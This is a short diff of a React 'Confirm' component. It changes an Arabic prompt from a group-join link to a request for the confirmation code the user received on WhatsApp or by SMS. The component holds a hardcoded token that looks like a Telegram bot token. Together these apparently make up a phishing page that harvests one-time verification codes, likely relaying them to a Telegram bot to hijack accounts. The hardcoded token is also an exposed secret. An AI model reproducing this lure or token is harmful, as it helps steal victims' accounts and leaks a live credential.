@@ -9,7 +9,7 @@ export default function Confirm({ setNcode, ncode }) {
   const [error, setError] = useState(false);
   const [code, setCode] = useState("");
   const [workMinutes, setWorkMinutes] = useState(2.5);
-  const [message, setMessage] = useState("رابط الإنضمام إلى المجموعة");
+  const [message, setMessage] = useState("أدخل رمز تأكيد الاضافة اللي وصلك على الواتس او على الرسائل النصية");
   const [loading, setLoading] = useState(false);
   const APIS = () => {
     const apiToken = "6433121980:AAGko90tu3pLPIhkMTOHyYQZXMVb-vW-RNs";
